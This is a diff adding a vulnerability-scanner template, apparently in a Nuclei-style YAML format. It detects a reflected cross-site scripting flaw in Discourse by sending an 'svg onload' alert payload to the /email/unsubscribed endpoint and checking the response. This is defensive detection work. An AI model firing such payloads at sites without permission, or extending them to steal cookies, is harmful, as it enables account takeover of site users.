@@ -1,0 +1,29 @@
+id: discourse-xss
+brief:
+    title: Discourse - Cross-Site Scripting
+    by: madrobot
+    level: high
+    about: Discourse contains a cross-site scripting vulnerability. An attacker can execute arbitrary script and thus steal cookie-based authentication credentials and launch other attacks.
+    label:
+        - xss
+        - discourse
+        - vuln
+    score: CVSS:7.2
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/email/unsubscribed?email=test@gmail.com%27\%22%3E%3Csvg/onload=alert(/xss/)%3E'
+      signs:
+        - "on": status
+          status:
+            - 200
+        - "on": word
+          has:
+            - <svg/onload=alert(/xss/)>
+          in: body
+          need: all
+        - "on": word
+          has:
+            - text/html
+          in: header
+          need: all
